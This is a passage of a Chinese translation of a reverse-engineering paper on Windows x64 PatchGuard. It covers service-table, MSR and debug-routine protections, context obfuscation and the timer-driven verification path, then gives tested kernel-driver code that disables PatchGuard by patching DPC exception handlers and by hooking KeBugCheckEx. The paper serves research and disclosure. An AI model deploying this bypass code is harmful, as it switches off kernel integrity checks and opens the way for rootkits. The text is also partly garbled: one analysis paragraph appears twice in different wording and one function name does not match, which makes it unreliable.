分发表现在包含相对地址数组这一事实，是打算把系统调用挂钩代码从 32 位平台移植到 x64 内核的驱动开发者必须跨越的一道障碍。解决这个相对地址问题的一个办法相当简单。在 2 GB 的可相对寻址内存中，有很多地方可以放置一个供挂钩例程使用的跳板（trampoline）。例如，符号之间常常有对齐填充。这种方法相当取巧，并且它依赖于 PatchGuard 被强制禁用这一事实。不过，也还有其他更优雅的方法可以做到这一点，两者都不需要。

就保护系统服务表而言，PatchGuard 同时保护存放在 nt!KiServiceTable 中的原生系统服务分发表，以及 nt!KeServiceDescriptorTable 结构本身。这是通过使用在系统映像一节中提到的 nt!PgCreateBlockChecksumSubContext 例程来完成的。下面的代码显示了对这两项如何调用块校验和例程：

```
PgCreateBlockChecksumSubContext(
    ParentContext,
    0,
    KeServiceDescriptorTable->DispatchTable, // KiServiceTable
    KiServiceLimit * sizeof(ULONG),
    0,
    NULL);

PgCreateBlockChecksumSubContext(
    ParentContext,
    0,
    &KeServiceDescriptorTable,
    0x20,
    0,
    NULL);
```

nt!KeServiceDescriptorTable 结构也受到保护的原因，是阻止对那个指向实际分发表的属性的修改。

#### 3.2.4) Processor MSRs / 处理器 MSR

最新、最好的处理器已大大改进了完成用户模式到内核模式转换的方法。在这些增强出现之前，包括 Windows 在内的大多数操作系统都被迫专门分配一个软中断作为系统调用向量。较新的处理器拥有专门用于分发系统调用的指令集，例如 syscall 和 sysenter 指令。这些指令的工作方式之一，是利用一个由处理器定义的、型号特定的寄存器（MSR），其中包含当收到系统调用时意在内核模式下获得控制权的例程的地址。在 x64 架构上，控制这个值的 MSR 名为 LSTAR，是 Long System Target-Address Register（长模式系统目标地址寄存器）的缩写。与这个 MSR 关联的代码是 0xc0000082。在启动期间，x64 内核把这个 MSR 初始化为 nt!KiSystemCall64。

为了阻止第三方通过改变 LSTAR MSR 的值来挂钩系统调用，PatchGuard 创建了一个类型为 7 的保护子上下文来缓存该 MSR 的值。负责完成此事的例程被标记为 PgCreateMsrSubContext，其原型如下所示：

```
PPATCHGUARD_SUB_CONTEXT PgCreateMsrSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN UCHAR Processor);
```

与 GDT/IDT 保护一样，LSTAR MSR 的值必须按每个处理器分别获得，因为 MSR 值天生就存放在单个处理器上。为支持这一点，该例程在一个遍历所有处理器的循环上下文中被调用，并传入它要读取的处理器标识符。为了确保从正确的处理器获得 MSR 值，PatchGuard 使用 nt!KeSetAffinityThread 使调用线程运行在适当的处理器上。

#### 3.2.5) Debug Routines / 调试例程

PatchGuard 创建了一个特殊的子上下文（类型 6），用于保护内核内部用于调试目的的一些例程。这些例程，例如 nt!KdpStub，意在用作一种机制：让附着的调试器在允许内核分发异常之前先处理该异常。nt!KdpStub（原文此处误作 bt!KdpStub）由 nt!KiDispatchException 通过全局变量 nt!KiDebugRoutine 间接调用。初始化这些例程的保护子上下文的例程被标记为 nt!PgCreateDebugRoutineSubContext，其原型如下所示：

```
PPATCHGUARD_SUB_CONTEXT PgCreateDebugRoutineSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext);
```

看来该子上下文结构被初始化为指向 nt!KdpStub、nt!KdpTrap 和 nt!KiDebugRoutine 的指针。看来这个子上下文意在保护第三方驱动不把 nt!KiDebugRoutine 修改为指向别处。也可能还有其他意图。

### 3.3) Obfuscating the PatchGuard Contexts / 混淆 PatchGuard 上下文

为了让在内存中定位 PatchGuard 上下文更具挑战性，每个上下文都用一个随机生成的 64 位密钥做 XOR 处理。这是通过调用被标记为 nt!PgEncryptContext 的函数来完成的，该函数就地对所提供的上下文缓冲区做 XOR，然后返回用于加密它的 XOR 密钥。这个函数的原型如下所示：

```
ULONG64 PgEncryptContext(
    IN OUT PPATCHGUARD_CONTEXT Context);
```

在 nt!KiInitializePatchGuard 初始化了所有单独的子上下文之后，它做的下一件事是加密主 PatchGuard 上下文。为此，它首先在栈上制作该上下文的一份副本，以便在加密之后仍能以明文形式引用它。需要明文副本的原因是，校验例程需要被排队执行，而要做到这一点，就必须引用上下文结构的某些属性。这一点将在下一节中详细讨论。副本创建之后，调用 nt!PgEncryptContext，把主 PatchGuard 上下文作为第一个参数传入。一旦校验例程已被排队执行，明文副本就不再需要，并被重新置零，以确保不留下任何明文引用。下面的伪代码说明了这一行为：

```
PATCHGUARD_CONTEXT LocalCopy;
ULONG64 XorKey;

memmove(
    &LocalCopy,
    Context,
    sizeof(PATCHGUARD_CONTEXT)); // 0x1b8

XorKey = PgEncryptContext(
    Context);

... Use LocalCopy for verification routine queuing ...
（…使用 LocalCopy 来排队校验例程…）

memset(
    &LocalCopy,
    0,
    sizeof(LocalCopy));
```

### 3.4) Executing the PatchGuard Verification Routine / 执行 PatchGuard 校验例程

收集校验和、缓存关键结构的值固然很好，但如果没有办法对它进行校验，那就毫无意义。为此，PatchGuard 竭尽全力让校验例程的执行尽可能隐蔽。这是通过使用误导和混淆来实现的。

在所有子上下文都初始化完毕之后、但在加密主上下文之前，nt!KiInitializePatchGuard 执行其较为关键的操作之一。在这个阶段，将间接用于处理 PatchGuard 校验的例程，从一个函数指针数组中随机选出，并存放在主 PatchGuard 上下文中偏移 0x168 处。在数组中找到的这些函数有一个非常特殊的目的，稍后将在本节中更详细地讨论。现在，先记住一个校验例程已经被选出这一事实。

选好校验例程之后，主 PatchGuard 上下文按上一节所述被加密。加密完成之后，初始化一个定时器，它使用一个在 PatchGuard 初始化过程早期由 nt!KiInitializePatchGuard 分配的子上下文。定时器通过调用 nt!KeInitializeTimer 来初始化，其中传入的指向定时器结构的指针实际上是先前分配的子上下文结构的一部分。紧跟在已初始化定时器结构之后的内存中、偏移 0x88 处，是字值 0x1131。反汇编时，这两个字节翻译为一条 xor [rcx], edx 指令。如果仔细查看 nt!CmpAppendDllSection 的前两个字节，就会看到它的第一条指令恰好由那两个字节构成。虽然在此刻并不重要，但稍后可能有用。

定时器结构初始化之后，PatchGuard 通过调用一个被标记为 nt!PgInitializeTimer 的函数，开始把定时器排队执行的过程，其原型如下所示：

```
VOID PgInitializeTimer(
    IN PPATCHGUARD_CONTEXT Context,
    IN PVOID EncryptedContext,
    IN ULONG64 XorKey,
    IN ULONG UnknownZero);
```

在 nt!PgInitializeTimer 例程内部，发生了一些奇怪的事情。首先，初始化一个 DPC（Deferred Procedure Call，延迟过程调用），它使用本节前面所述的随机选出的校验例程作为 DeferredRoutine（延迟例程）。然后，作为参数传入的 EncryptedContext 指针与 XorKey 参数做 XOR，产生一个完全虚假的指针，该指针作为 DeferredContext 参数传给 nt!KeInitializeDpc。最终结果是看上去像这样的伪代码：

```
KeInitializeDpc(
    &Dpc,
    Context->TimerDpcRoutine,
    EncryptedContext ^ ~(XorKey << UnknownZero));
```

DPC 初始化之后，调用 nt!KeSetTimer 把该 DPC 排队等待执行。DueTime 参数是随机生成的，以使其更难被特征匹配（signature），同时有一个确定的上限，以确保它在一个合理的时间范围内被执行。设置定时器之后，nt!PgInitializeTimer 返回给调用者。

定时器初始化并设置为执行之后，nt!KiInitializePatchGuard 就完成了它的操作并返回到 nt!KiFilterFiberContext。引发整个初始化过程的除法错误故障被纠正，执行恢复到 nt!KiDivide6432 中 div 指令之后的指令，从而允许内核正常启动。

不过，这只是乐趣的一半。现在真正的问题是校验例程如何被执行。显而易见，它与设置定时器时使用的 DPC 例程有关，所以最合乎逻辑的查看地点就在那里。回想本节前面所述，nt!KiInitializePatchGuard 从一个例程数组中随机选出一个校验例程地址。这个数组可以通过查看 PatchGuard 初始化例程的这段反汇编找到：

```
nt!KiDivide6432+0xec3:
fffff800`01423e74 8bc1             mov     eax,ecx
fffff800`01423e76 488d0d83c1bdff   lea     rcx,[nt]
fffff800`01423e7d 488b84c128044300 mov     rax,[rcx+rax*8+0x430428]
```

同样，这里使用了与隐藏池标签数组相同的混淆技术。把 0x430428 加到 nt 的基址上，DPC 例程数组就显露出来了：

```
lkd> dqs nt+0x430428 L3
fffff800`01430428  fffff800`01033b10 nt!KiScanReadyQueues
fffff800`01430430  fffff800`011010e0 nt!ExpTimeRefreshDpcRoutine
fffff800`01430438  fffff800`0101dd10 nt!ExpTimeZoneDpcRoutine
```

这告诉了我们 PatchGuard 可能使用的 DPC 例程的可能排列组合，但并没有告诉我们这实际上如何导致保护上下文的校验。合乎逻辑的下一步，是试图基于传递给它的 DeferredContext 来理解这些例程之一如何运作，因为从 nt!PgInitializeTimer 可知，DeferredContext 参数将指向与一个加密密钥做了 XOR 的 PatchGuard 上下文。在这三个例程中，nt!ExpTimeRefreshDpcRoutine 最容易理解。该函数前几条指令的反汇编如下所示：

```
lkd> u nt!ExpTimeRefreshDpcRoutine
nt!ExpTimeRefreshDpcRoutine:
fffff800`011010e0 48894c2408       mov     [rsp+0x8],rcx
fffff800`011010e5 4883ec68         sub     rsp,0x68
fffff800`011010e9 b801000000       mov     eax,0x1
fffff800`011010ee 0fc102           xadd    [rdx],eax
fffff800`011010f1 ffc0             inc     eax
fffff800`011010f3 83f801           cmp     eax,0x1
```

延迟例程的原型是：第一个参数是与其关联的 DPC 的指针，第二个参数是 DeferredContext 指针。x64 调用约定告诉我们，这等价于 rcx 指向 DPC 结构、rdx 指向 DeferredContext 指针。但这里有一个问题。该函数的第四条指令试图对 DeferredContext 的第一部分执行一条 xadd。如前所述，传给 DPC 例程的 DeferredContext 是一个指针与 XOR 运算的结果，产生一个完全虚假的指针。这应该意味着机器一解引用该指针就会立即崩溃，对吗？答案显然是否定的，而这里又出现了另一个误导案例。

事实是，nt!ExpTimeRefreshDpcRoutine、nt!ExpTimeZoneDpcRoutine 和 nt!KiScanReadyQueues 都是完全合法的例程，与 PatchGuard 本身没有任何直接关系。相反，它们被用作间接执行那些确实与 PatchGuard 有关的代码的手段。这三个例程的独特之处在于，它们三个都会在某个时刻解引用其 DeferredContext 指针，如下所示：

```
lkd> u fffff800`01033b43 L1
nt!KiScanReadyQueues+0x33:
fffff800`01033b43 8b02             mov     eax,[rdx]
lkd> u fffff800`0101dd1e L1
nt!ExpTimeZoneDpcRoutine+0xe:
fffff800`0101dd1e 0fc102           xadd    [rdx],eax
```

当 DeferredContext 操作发生时，会引发一个一般保护故障（General Protection Fault）异常，并被传递给 nt!KiGeneralProtectionFault。这个例程随后最终导致与触发故障的例程（例如 nt!ExpTimeRefreshDpcRoutine）相关联的异常处理程序被执行。在 x64 上，异常处理代码与大多数人在 32 位上习惯的完全不同。函数不是在运行时注册异常处理程序，而是每个函数在编译时指定其异常处理程序，其方式允许通过一个标准化 API 例程（例如 nt!RtlLookupFunctionEntry）来查找它们。这个 API 例程返回关于该函数的、存放在 RUNTIME_FUNCTION 结构中的信息，其中最重要的是展开信息（unwind information）。展开信息包括异常处理程序的地址（如果有的话）。虽然这大体上超出本文范围，但人们可以通过在调试器中执行以下操作来确定 nt!ExpTimeRefreshDpcRoutine 的异常处理程序的地址：

```
lkd> .fnent nt!ExpTimeRefreshDpcRoutine
Debugger function entry 00000000`01cdaa4c for:
(fffff800`011010e0)   nt!ExpTimeRefreshDpcRoutine   |
(fffff800`011011d0)   nt!ExpCenturyDpcRoutine
Exact matches:
    nt!ExpTimeRefreshDpcRoutine = <no type information>

BeginAddress      = 00000000`001010e0
EndAddress        = 00000000`0010110d
UnwindInfoAddress = 00000000`00131274
lkd> u nt + dwo(nt + 00131277 + (by(nt + 00131276) * 2) + 13)
nt!ExpTimeRefreshDpcRoutine+0x40:
fffff800`01101120 8bc0             mov     eax,eax
fffff800`01101122 55               push    rbp
fffff800`01101123 4883ec30         sub     rsp,0x30
fffff800`01101127 488bea           mov     rbp,rdx
fffff800`0110112a 48894d50         mov     [rbp+0x50],rcx
```

更仔细地查看这个异常处理程序，可以看到它在某个条件下发出对 nt!KeBugCheckEx 的调用，错误检查代码为 0x109。这个错误检查代码正是 PatchGuard 用来指示一个关键结构已被篡改的代码，所以这是一个非常好的迹象，表明这个异常处理程序至少全部或部分与 PatchGuard 有关。

这三个例程各自的异常处理程序大致等价，执行相同的操作。如果 DeferredContext 没有被意外篡改，那么这些异常处理程序最终会调用保护上下文中那份从 INITKDB（原文如此，应为 INITKDBG）复制来的代码，特别是 nt!FsRtlUninitializeSmallMcb。这个例程调用名为 nt!FsRtlMdlReadCompleteDevEx 的符号，而它实际上负责调用各个子上下文校验例程。

### 3.5) Reporting Verification Inconsistencies / 报告校验不一致

在 PatchGuard 检测到一个关键结构已被修改的情况下，它会调用名为 nt!SdpCheckDll 的符号的代码复制版本，参数随后将通过存放在 PatchGuard 上下文中的函数表传给 nt!KeBugCheckEx。nt!SdbpCheckDll（原文前后拼写不一）的目的是在跳转到 nt!KeBugCheckEx 之前，把当前帧之前的栈和所有寄存器清零。据推测，这样做是为了试图使第三方驱动不可能检测到错误检查报告并从中恢复。如果所有检查都按计划进行且不存在不一致，该例程会创建一个新的 PatchGuard 上下文，并使用第一次被选中的同一个例程再次设置定时器。

## 4) Bypass Approaches / 绕过方法

在解释了 PatchGuard 如何运作的最关键方面之后，下一个目标是试图看看是否存在任何可以绕过它所提供的保护机制的方法。这将需要禁用校验例程，或者欺骗校验例程。虽然有许多显而易见的方法，例如创建一个在 PatchGuard 初始化之前运行的自定义引导加载程序，或者通过修改 ntoskrnl.exe 来完全排除其初始化向量，但本章讨论的方法旨在可在真实世界环境中使用，无需求助于侵入性操作，也无需重启机器。事实上，首要目标是创建一个单独的独立函数、或几个函数，可以把它们放入设备驱动中，让驱动只需调用一个例程就能禁用 PatchGuard 保护，从而驱动现有的挂钩关键结构的方法仍能被使用。

重要的是要注意，这里列出的一些方法尚未经过测试，只是理论性的。那些已经过测试的将被注明。在深入具体的绕过方法之前，同样重要的是考虑在运行时禁用 PatchGuard 的通用技术。首先，必须考虑校验例程是如何被设置运行的，以及它依赖什么来完成校验。在这里，校验例程被设置为在一个定时器的上下文中运行，该定时器与一个 DPC 相关联，该 DPC 从一个系统工作线程运行，最终导致一个异常处理程序被调用。所用的 DPC 例程是从一个小函数池中随机选出的，定时器对象被赋予一个随机的 DueTime，努力使其更难被检测。

除了校验向量之外，还已知当 PatchGuard 遇到不一致时，它会以一个特定的错误检查代码调用 nt!KeBugCheckEx，试图使系统崩溃。这些理解上的点滴，使人们能够考虑范围广泛的绕过方法。

### 4.1) Exception Handler Hooking / 异常处理程序挂钩

既然已知校验例程间接依赖于与三个定时器 DPC 例程相关联的异常处理程序来运行代码，那么顺理成章地，也许可以改变每个异常处理程序的行为，使其简单地变成一个无操作（no-operation）。这意味着，一旦 DPC 例程执行并触发一般保护故障，异常处理程序将被调用，并将简单地不执行任何操作，而不是做校验检查。这种方法已经过测试，并已确认在当前 PatchGuard 实现上有效。

完成此事所采取的方法是，首先找到已知与 PatchGuard 相关联的例程列表。就目前而言，该列表只包含三个函数，但将来该列表可能会改变。定位例程数组之后，必须提取每个例程的异常处理程序，然后随后把它打补丁，使其返回 0x1 然后返回。下面可以找到一个实现此算法的示例函数：

```
static CHAR CurrentFakePoolTagArray[] =
    "AcpSFileIpFIIrp MutaNtFsNtrfSemaTCPc";

NTSTATUS DisablePatchGuard() {
    UNICODE_STRING SymbolName;
    NTSTATUS       Status = STATUS_SUCCESS;
    PVOID *        DpcRoutines = NULL;
    PCHAR          NtBaseAddress = NULL;
    ULONG          Offset;

    RtlInitUnicodeString(
            &SymbolName,
            L"__C_specific_handler");

    do
    {
        //
        // Get the base address of nt
        //
        if (!RtlPcToFileHeader(
                MmGetSystemRoutineAddress(&SymbolName),
                (PCHAR *)&NtBaseAddress))
        {
            Status = STATUS_INVALID_IMAGE_FORMAT;
            break;
        }

        //
        // Search the image to find the first occurrence of:
        //
        //    "AcpSFileIpFIIrp MutaNtFsNtrfSemaTCPc"
        //
        // This is the fake tag pool array that is used to allocate protection
        // contexts.
        //
        __try
        {
            for (Offset = 0;
                 !DpcRoutines;
                 Offset += 4)
            {
                //
                // If we find a match for the fake pool tag array, the DPC routine
                // addresses will immediately follow.
                //
                if (memcmp(
                        NtBaseAddress + Offset,
                        CurrentFakePoolTagArray,
                        sizeof(CurrentFakePoolTagArray) - 1) == 0)
                    DpcRoutines = (PVOID *)(NtBaseAddress +
                            Offset + sizeof(CurrentFakePoolTagArray) + 3);
            }

        } __except(EXCEPTION_EXECUTE_HANDLER)
        {
            //
            // If an exception occurs, we failed to find it.  Time to bail out.
            //
            Status = GetExceptionCode();
            break;
        }

        DebugPrint(("DPC routine array found at %p.",
                DpcRoutines));

        //
        // Walk the DPC routine array.
        //
        for (Offset = 0;
             DpcRoutines[Offset] && NT_SUCCESS(Status);
             Offset++)
        {
            PRUNTIME_FUNCTION Function;
            ULONG64           ImageBase;
            PCHAR             UnwindBuffer;
            UCHAR             CodeCount;
            ULONG             HandlerOffset;
            PCHAR             HandlerAddress;
            PVOID             LockedAddress;
            PMDL              Mdl;

            //
            // If we find no function entry, then go on to the next entry.
            //
            if ((!(Function = RtlLookupFunctionEntry(
                    (ULONG64)DpcRoutines[Offset],
                    &ImageBase,
                    NULL))) ||
                (!Function->UnwindData))
            {
                Status = STATUS_INVALID_IMAGE_FORMAT;
                continue;
            }

            //
            // Grab the unwind exception handler address if we're able to find one.
            //
            UnwindBuffer  = (PCHAR)(ImageBase + Function->UnwindData);
            CodeCount     = UnwindBuffer[2];

            //
            // The handler offset is found within the unwind data that is specific
            // to the language in question.  Specifically, it's +0x10 bytes into
            // the structure not including the UNWIND_INFO structure itself and any
            // embedded codes (including padding).  The calculation below accounts
            // for all these and padding.
            //
            HandlerOffset = *(PULONG)((ULONG64)(UnwindBuffer + 3 + (CodeCount * 2) + 20) & ~3);

            //
            // Calculate the full address of the handler to patch.
            //
            HandlerAddress = (PCHAR)(ImageBase + HandlerOffset);

            DebugPrint(("Exception handler for %p found at %p (unwind %p).",
                    DpcRoutines[Offset],
                    HandlerAddress,
                    UnwindBuffer));

            //
            // Finally, patch the routine to simply return with 1.  We'll patch
            // with:
            //
            // 6A01 push byte 0x1
            // 58   pop eax
            // C3   ret
            //

            //
            // Allocate a memory descriptor for the handler's address.
            //
            if (!(Mdl = MmCreateMdl(
                    NULL,
                    (PVOID)HandlerAddress,
                    4)))
            {
                Status = STATUS_INSUFFICIENT_RESOURCES;
                continue;
            }

            //
            // Construct the Mdl and map the pages for kernel-mode access.
            //
            MmBuildMdlForNonPagedPool(
                    Mdl);

            if (!(LockedAddress = MmMapLockedPages(
                    Mdl,
                    KernelMode)))
            {
                IoFreeMdl(
                        Mdl);

                Status = STATUS_ACCESS_VIOLATION;
                continue;
            }

            //
            // Interlocked exchange the instructions we're overwriting with.
            //
            InterlockedExchange(
                    (PLONG)LockedAddress,
                    0xc358016a);

            //
            // Unmap and destroy the MDL
            //
            MmUnmapLockedPages(
                    LockedAddress,
                    Mdl);

            IoFreeMdl(
                    Mdl);
        }

    } while (0);

    return Status;
}
```

这种方法的好处包括：它体积小、相对简单。如果某些东西发生变化，它也相当容错。然而，它的一些缺点包括：它依赖于池标签数组紧挨着位于 DPC 例程地址数组之前，而且它还依赖于池标签数组是一个固定值。微软完全有可能在将来消除这一假设。出于这些原因，在生产驱动中最好不要使用这种方法，但它至少足以用于演示目的。

为了让微软破坏这种方法，他们将不得不使该方法所做的某些假设变得不可靠。例如，DPC 例程数组可以被移到一个不紧跟在池标签数组之后的位置。这意味着该例程将不得不硬编码或以其他方式推导出 PatchGuard 所用的 DPC 例程数组。另一个选择是把池标签数组拆分开，使它不是一个可以轻易搜索到的浓缩字符串。实际上，阻止这种方法可靠实现的相对复杂程度是相当小的。

这种方法的好处包括：它体积小、相对简单易懂。如果某些东西发生变化，它也相当容错。然而，它的一些缺点包括：它依赖于池标记数组紧挨着位于 DPC 例程地址数组之前，而且它还依赖于池标记数组是一个固定值。微软在未来完全有可能消除这一假设。出于这些原因，在生产驱动程序中最好不要使用这种方法，但它至少足够适合演示目的。

为了让微软破坏这种方法，他们必须使该方法所做的某些假设变得不可靠。例如，DPC 例程数组可以被移动到一个并不紧跟在池标记数组之后的位置。这意味着该例程将不得不硬编码或以其他方式推导出 PatchGuard 使用的 DPC 例程数组。另一个选择是把池标记数组拆开，使它不是一个容易搜索的浓缩字符串。实际上，阻止这种方法被可靠实现的相对复杂程度是相当小的。

### 4.2) KeBugCheckEx Hook / KeBugCheckEx 挂钩

PatchGuard 保护中一个不可避免的事实是，它必须以某种方式报告校验不一致。事实上，它报告的方式必须包含关闭机器，以阻止第三方厂商在检测到补丁之后仍能继续运行代码。就目前而言，完成此事所采取的方法，是通过 nt!KeBugCheckEx 发出一个符号代码为 0x109 的错误检查。采取这条路线，是为了让最终用户知道发生了什么，而不至于在机器突然关机或重启且没有任何解释时被蒙在鼓里、真的陷入黑暗。

作者在思考绕过技术时想到的第一个主意，是试图让 nt!KeBugCheckEx 返回到调用者的调用者帧（caller's caller frame）。这样做是必要的，因为你不能返回到调用者，因为编译器通常会在对 nt!KeBugCheckEx 的调用之后立即插入一个调试器陷阱。然而，也许有可能返回到调用者的调用者的帧。换句话说，就是那个调用了导致 nt!KeBugCheckEx 被调用的函数的例程。然而，如本文前面所述，PatchGuard 代码小心翼翼地确保在调用 nt!KeBugCheckEx 之前把栈清零。这实际上消除了栈上可能用于返回父帧的任何上下文引用。这样一来，nt!KeBugCheckEx 挂钩向量似乎是一条死路。恰恰相反，并非如此。

一种可以采取的衍生方法，不必担心存放在寄存器中或栈上的上下文，它利用了这样一个事实：每个线程都保留着自己的入口点地址。对于系统工作线程，入口点通常指向像 nt!ExpWorkerThread 这样的例程。由于会生成多个工作线程，传给线程的上下文参数无关紧要，因为工作线程实际上只是被用来处理工作项和使 DPC 例程到期。心中有了这一事实，这种方法就归结为：挂钩 nt!KeBugCheckEx，并检测是否传入了错误检查代码 0x109。如果没有，则可以调用原始的 nt!KeBugCheckEx 例程。然而，如果是 0x109，那么可以通过把调用线程的栈指针恢复为其栈限（stack limit）减 8，然后跳转到该线程的 StartAddress 来重新启动该线程。最终结果是，该线程像正常情况一样回去处理工作项和使 DPC 例程到期。

虽然一种更显而易见的方法是简单地终止调用线程，但这样做是不可能的。操作系统会跟踪系统工作线程，并会检测到某个线程退出。系统工作线程退出的行为将导致系统蓝屏——这正是所试图避免的那类事情。

下面的代码实现了上面描述的算法。它相当庞大，原因将在代码片段之后讨论：

```
== ext.asm

.data

EXTERN OrigKeBugCheckExRestorePointer:PROC
EXTERN KeBugCheckExHookPointer:PROC

.code

;
; Points the stack pointer at the supplied argument and returns to the caller.
;
public AdjustStackCallPointer
AdjustStackCallPointer PROC
    mov rsp, rcx
    xchg r8, rcx
    jmp rdx
AdjustStackCallPointer ENDP

;
; Wraps the overwritten preamble of KeBugCheckEx.
;
public OrigKeBugCheckEx
OrigKeBugCheckEx PROC
    mov [rsp+8h], rcx
    mov [rsp+10h], rdx
    mov [rsp+18h], r8
    lea rax, [OrigKeBugCheckExRestorePointer]
    jmp qword ptr [rax]
OrigKeBugCheckEx ENDP

END

== antipatch.c

//
// Both of these routines reference the assembly code described
// above
//
extern VOID OrigKeBugCheckEx(
        IN ULONG BugCheckCode,
        IN ULONG_PTR BugCheckParameter1,
        IN ULONG_PTR BugCheckParameter2,
        IN ULONG_PTR BugCheckParameter3,
        IN ULONG_PTR BugCheckParameter4);
extern VOID AdjustStackCallPointer(
        IN ULONG_PTR NewStackPointer,
        IN PVOID StartAddress,
        IN PVOID Argument);

//
// mov eax, ptr
// jmp eax
//
static CHAR HookStub[] =
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xe0";

//
// The offset into the ETHREAD structure that holds the start routine.
//
static ULONG ThreadStartRoutineOffset = 0;

//
// The pointer into KeBugCheckEx after what has been overwritten by the hook.
//
PVOID OrigKeBugCheckExRestorePointer;

VOID KeBugCheckExHook(
        IN ULONG BugCheckCode,
        IN ULONG_PTR BugCheckParameter1,
        IN ULONG_PTR BugCheckParameter2,
        IN ULONG_PTR BugCheckParameter3,
        IN ULONG_PTR BugCheckParameter4)
{
    PUCHAR LockedAddress;
    PCHAR  ReturnAddress;
    PMDL   Mdl = NULL;


    //
    // Call the real KeBugCheckEx if this isn't the bug check code we're looking
    // for.
    //
    if (BugCheckCode != 0x109)
    {
        DebugPrint(("Passing through bug check %.4x to %p.",
                BugCheckCode,
                OrigKeBugCheckEx));

        OrigKeBugCheckEx(
                BugCheckCode,
                BugCheckParameter1,
                BugCheckParameter2,
                BugCheckParameter3,
                BugCheckParameter4);
    }
    else
    {
        PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
        PVOID StartRoutine  = *(PVOID **)(CurrentThread + ThreadStartRoutineOffset);
        PVOID StackPointer  = IoGetInitialStack();

        DebugPrint(("Restarting the current worker thread %p at %p (SP=%p, off=%lu).",
                PsGetCurrentThread(),
                StartRoutine,
                StackPointer,
                ThreadStartRoutineOffset));

        //
        // Shift the stack pointer back to its initial value and call the routine.  We
        // subtract eight to ensure that the stack is aligned properly as thread
        // entry point routines would expect.
        //
        AdjustStackCallPointer(
                (ULONG_PTR)StackPointer - 0x8,
                StartRoutine,
                NULL);
    }

    //
    // In either case, we should never get here.
    //
    __debugbreak();
}
VOID DisablePatchProtectionSystemThreadRoutine(
        IN PVOID Nothing)
{
    UNICODE_STRING SymbolName;
    NTSTATUS       Status = STATUS_SUCCESS;
    PUCHAR         LockedAddress;
    PUCHAR         CurrentThread = (PUCHAR)PsGetCurrentThread();
    PCHAR          KeBugCheckExSymbol;
    PMDL           Mdl = NULL;


    RtlInitUnicodeString(
            &SymbolName,
            L"KeBugCheckEx");

    do
    {
        //
        // Find the thread's start routine offset.
        //
        for (ThreadStartRoutineOffset = 0;
             ThreadStartRoutineOffset < 0x1000;
             ThreadStartRoutineOffset += 4)
        {
            if (*(PVOID **)(CurrentThread +
                    ThreadStartRoutineOffset) == (PVOID)DisablePatchProtection2SystemThreadRoutine)
                break;
        }

        DebugPrint(("Thread start routine offset is 0x%.4x.",
                ThreadStartRoutineOffset));

        //
        // If we failed to find the start routine offset for some strange reason,
        // then return not supported.
        //
        if (ThreadStartRoutineOffset >= 0x1000)
        {
            Status = STATUS_NOT_SUPPORTED;
            break;
        }

        //
        // Get the address of KeBugCheckEx.
        //
        if (!(KeBugCheckExSymbol = MmGetSystemRoutineAddress(
                &SymbolName)))
        {
            Status = STATUS_PROCEDURE_NOT_FOUND;
            break;
        }

        //
        // Calculate the restoration pointer.
        //
        OrigKeBugCheckExRestorePointer = (PVOID)(KeBugCheckExSymbol + 0xf);

        //
        // Create an initialize the MDL.
        //
        if (!(Mdl = MmCreateMdl(
                NULL,
                (PVOID)KeBugCheckExSymbol,
                0xf)))
        {
            Status = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        MmBuildMdlForNonPagedPool(
                Mdl);

        //
        // Probe & Lock.
        //
        if (!(LockedAddress = (PUCHAR)MmMapLockedPages(
                Mdl,
                KernelMode)))
        {
            IoFreeMdl(
                    Mdl);

            Status = STATUS_ACCESS_VIOLATION;
            break;
        }

        //
        // Set the aboslute address to our hook.
        //
        *(PULONG64)(HookStub + 0x2) = (ULONG64)KeBugCheckExHook;

        DebugPrint(("Copying hook stub to %p from %p (Symbol %p).",
                LockedAddress,
                HookStub,
                KeBugCheckExSymbol));

        //
        // Copy the relative jmp into the hook routine.
        //
        RtlCopyMemory(
                LockedAddress,
                HookStub,
                0xf);

        //
        // Cleanup the MDL.
        //
        MmUnmapLockedPages(
                LockedAddress,
                Mdl);

        IoFreeMdl(
                Mdl);

    } while (0);
}

//
// A pointer to KeBugCheckExHook
//
PVOID KeBugCheckExHookPointer = KeBugCheckExHook;

NTSTATUS DisablePatchProtection() {
    OBJECT_ATTRIBUTES Attributes;
    NTSTATUS          Status;
    HANDLE            ThreadHandle = NULL;

    InitializeObjectAttributes(
            &Attributes,
            NULL,
            OBJ_KERNEL_HANDLE,
            NULL,
            NULL);

    //
    // Create the system worker thread so that we can automatically find the
    // offset inside the ETHREAD structure to the thread's start routine.
    //
    Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            &Attributes,
            NULL,
            NULL,
            DisablePatchProtectionSystemThreadRoutine,
            NULL);

    if (ThreadHandle)
        ZwClose(
                ThreadHandle);

    return Status;
}
```

这种方法已经过测试，并已证实对本文写作时当前版本的 PatchGuard 有效。这种方法优于其他方法的好处是，它不依赖任何未导出的依赖项或特征，它具有零性能开销（因为除非机器要崩溃，否则 nt!KeBugCheckEx 从不被调用），并且它不受竞态条件的影响。作者所知的它唯一的主要缺点是，它依赖于系统工作线程的行为保持不变——就以 NULL 上下文将执行恢复到线程入口点是安全的而言。迄今为止，人们假设这将继续是一个安全的赌注。

为了消除这种方法作为一种可能的绕过技术，微软可以做几件事中的一件。首先，他们可以创建一个新的保护子上下文，存放 nt!KeBugCheckEx 及其所调用函数的校验和。如果检测到 nt!KeBugCheckEx 已被篡改，PatchGuard 可以在不调用任何外部函数的情况下进行硬重启（hard reboot）。虽然这是一种不太理想的行为，但它似乎是微软能可靠解决这一问题的少数几种方法之一。任何其他依赖于调用可在确定性地址找到的外部函数的方法，都会为类似的绕过技术提供机会。

第二种不太有用的方法是，在调用 nt!KeBugCheckEx 之前，把线程结构中的某些字段清零。虽然这将阻止上述方法起作用，但它肯定不会阻止另一种（也许或多或少取巧的）方法起作用。所需要的只是能够让工作线程返回其处理排队工作项的正常运作。

### 4.3) Finding the Timer / 找到定时器

